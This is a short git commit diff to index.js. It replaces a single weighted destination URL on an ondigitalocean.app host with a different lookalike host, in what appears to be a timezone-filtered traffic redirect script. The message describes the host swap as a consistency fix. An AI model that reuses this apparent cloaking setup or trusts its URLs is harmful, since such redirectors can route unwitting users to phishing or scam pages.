f156e6e390bb3ed8547cae0a617655db94daa03a
paalakash <palaksh452@gmail.com>
2026-07-15 13:04:04 +0530

    Update URLs in RAW_CONFIGS array
    Corrected URL entries in RAW_CONFIGS for consistency.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://ios-app-tkv3j.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://io-s-app-w65t8.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
